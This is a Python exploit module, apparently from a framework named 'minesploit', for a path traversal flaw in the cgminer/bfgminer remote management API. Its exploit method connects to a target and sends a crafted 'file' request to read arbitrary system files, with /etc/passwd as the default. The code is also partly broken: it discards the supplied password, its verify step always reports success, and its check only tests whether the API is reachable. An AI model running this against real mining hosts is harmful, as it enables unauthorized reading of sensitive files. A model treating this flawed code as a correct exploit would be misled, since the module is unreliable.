"""CVE-2018-10057: cgminer/bfgminer Remote API Path Traversal

This vulnerability allows remote authenticated attackers to read
arbitrary files via path traversal in the cgminer API.

Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10057
Reference: https://www.openwall.com/lists/oss-security/2018/06/03/1

Affected: cgminer <=4.10.0, bfgminer <=5.5.0
Severity: HIGH (7.5 CVSS)
"""

import asyncio

from minesploit.framework import Exploit, ExploitMeta, ExploitResult


class CVE_2018_CGMINER_PATH_TRAVERSAL(Exploit):
    meta = ExploitMeta(
        name="CVE-2018-10057: cgminer API Path Traversal",
        cve="CVE-2018-10057",
        cvss_score=7.5,
        severity="HIGH",
        affected_versions="cgminer <=4.10.0, bfgminer <=5.5.0",
        discovered_by="Gjoko Krstic",
        disclosure_date="2018-06-03",
        description=(
            "Path traversal vulnerability in cgminer and bfgminer remote management API "
            "allows authenticated remote attackers to read arbitrary files via "
            "specially crafted API requests"
        ),
        references=[
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10057",
            "https://www.openwall.com/lists/oss-security/2018/06/03/1",
        ],
    )

    def __init__(self):
        super().__init__()
        self.password = "admin"

    async def check(self, target: str, port: int = 8332, **kwargs) -> ExploitResult:
        password = kwargs.get("password", self.password)
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=5.0,
            )

            request = f'{{"command":"password","parameter":"{password}"}}\n'
            writer.write(request.encode())
            await writer.drain()

            response = await asyncio.wait_for(reader.read(4096), timeout=5.0)
            writer.close()
            await writer.wait_closed()

            if response:
                resp_str = response.decode("utf-8", errors="ignore")
                if "PASSWORD" in resp_str or "authenticated" in resp_str.lower():
                    return ExploitResult(
                        True,
                        "Target has cgminer API accessible",
                        {"vulnerable": True, "api_accessible": True},
                    )

            return ExploitResult(
                False,
                "Target does not appear to have cgminer API",
                {"vulnerable": False},
            )

        except asyncio.TimeoutError:
            return ExploitResult(False, "Connection timed out")
        except ConnectionRefusedError:
            return ExploitResult(False, "Connection refused")
        except Exception as e:
            return ExploitResult(False, f"Error: {str(e)}")

    async def exploit(
        self,
        target: str,
        port: int = 8332,
        filepath: str = "/etc/passwd",
        **kwargs,
    ) -> ExploitResult:
        _ = kwargs.get("password", self.password)

        try:
            path_traversal = filepath.lstrip("/")

            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=5.0,
            )

            request = f'{{"command":"file","parameter":"{path_traversal}"}}\n'
            writer.write(request.encode())
            await writer.drain()

            response = await asyncio.wait_for(reader.read(16384), timeout=5.0)
            writer.close()
            await writer.wait_closed()

            if response:
                return ExploitResult(
                    True,
                    f"Path traversal request sent for {filepath}",
                    {
                        "sent": True,
                        "filepath": filepath,
                        "response": response.decode("utf-8", errors="ignore")[:500],
                    },
                )

            return ExploitResult(False, "No response received")

        except Exception as e:
            return ExploitResult(False, f"Error during exploit: {str(e)}")

    async def verify(self, target: str, port: int = 8332, **kwargs) -> ExploitResult:
        return ExploitResult(
            True,
            "Verification requires checking if file was read",
        )
